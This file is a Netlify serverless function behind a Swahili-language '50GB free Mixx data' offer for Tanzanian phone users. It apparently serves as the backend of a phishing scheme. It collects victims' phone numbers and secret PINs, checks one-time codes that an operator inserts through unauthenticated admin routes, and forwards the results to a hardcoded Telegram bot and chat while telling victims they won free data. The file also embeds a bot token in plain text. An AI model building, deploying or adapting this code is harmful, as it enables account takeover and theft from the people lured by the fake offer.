// netlify/functions/send-to-telegram.js

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8979567614:AAHvIQzCZcEDbfZXZtFqt5pSpUpAduayra0';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';

const otpStore = {};

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, GET, DELETE, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    try {
        const path = event.path.replace('/.netlify/functions/send-to-telegram', '');

        // ===== VERIFY PIN =====
        if (event.httpMethod === 'POST' && path === '/verify-pin') {
            const { phone, pin } = JSON.parse(event.body);

            if (!phone || !pin) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Tafadhali jaza namba zote mbili.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            if (cleanPhone.length < 9) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya simu si sahihi.'
                    })
                };
            }

            if (!/^\d{4,5}$/.test(pin)) {
                return {
                    statusCode: 401,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Namba ya Siri lazima iwe tarakimu 4 au 5.'
                    })
                };
            }

            if (!otpStore[cleanPhone]) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Hakuna msimbo uliotumwa kwa namba hii. Wasiliana na admin.',
                        requiresAdmin: true
                    })
                };
            }

            const userData = otpStore[cleanPhone];

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    phone: cleanPhone,
                    otp: userData.otp,
                    referral: userData.referral || 'N/A'
                })
            };
        }

        // ===== VERIFY OTP =====
        if (event.httpMethod === 'POST' && path === '/verify-otp') {
            const { phone, otp } = JSON.parse(event.body);

            if (!phone || !otp) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Msimbo unahitajika.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            if (!otpStore[cleanPhone]) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Hakuna msimbo kwa namba hii.'
                    })
                };
            }

            const userData = otpStore[cleanPhone];

            if (userData.otp !== otp) {
                return {
                    statusCode: 401,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Msimbo si sahihi. Jaribu tena.'
                    })
                };
            }

            // Send to Telegram
            const referral = userData.referral || 'N/A';
            const timestamp = new Date().toISOString();

            const message = `
📱 *NEW MIXX REFERRAL!*

📞 *Phone:* ${cleanPhone}
🔗 *Referral Code:* ${referral}
📦 *Offer:* 50GB Mixx Data
🕐 *Time:* ${timestamp}

✅ *Status:* Successfully Activated!
            `;

            let telegramSuccess = false;
            let telegramError = null;

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                try {
                    const telegramResponse = await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                        {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: TELEGRAM_CHAT_ID,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        }
                    );

                    if (telegramResponse.ok) {
                        telegramSuccess = true;
                    } else {
                        telegramError = await telegramResponse.text();
                    }
                } catch (error) {
                    telegramError = error.message;
                }
            }

            delete otpStore[cleanPhone];

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: 'Hongera! Umepata 50GB DATA BURE.',
                    data: {
                        phone: cleanPhone,
                        offer: '50GB Mixx',
                        activated: true,
                        referral: referral,
                        telegramSent: telegramSuccess,
                        telegramError: telegramError
                    }
                })
            };
        }

        // ===== ADMIN: ADD OTP =====
        if (event.httpMethod === 'POST' && path === '/admin/add-otp') {
            const { phone, otp, referral } = JSON.parse(event.body);

            if (!phone || !otp) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Phone and OTP required.'
                    })
                };
            }

            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            otpStore[cleanPhone] = {
                otp: otp,
                referral: referral || 'N/A',
                created: new Date().toISOString()
            };

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: `OTP ${otp} added for ${cleanPhone}`,
                    data: otpStore
                })
            };
        }

        // ===== ADMIN: LIST OTPs =====
        if (event.httpMethod === 'GET' && path === '/admin/list-otps') {
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    data: otpStore,
                    count: Object.keys(otpStore).length
                })
            };
        }

        // ===== ADMIN: DELETE OTP =====
        if (event.httpMethod === 'DELETE' && path.startsWith('/admin/delete-otp/')) {
            const phone = path.replace('/admin/delete-otp/', '');
            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');

            if (!otpStore[cleanPhone]) {
                return {
                    statusCode: 404,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'OTP not found.'
                    })
                };
            }

            delete otpStore[cleanPhone];

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: `OTP deleted for ${cleanPhone}`
                })
            };
        }

        return {
            statusCode: 404,
            headers,
            body: JSON.stringify({
                success: false,
                message: 'Route not found'
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                success: false,
                message: 'Internal server error',
                error: error.message
            })
        };
    }
};
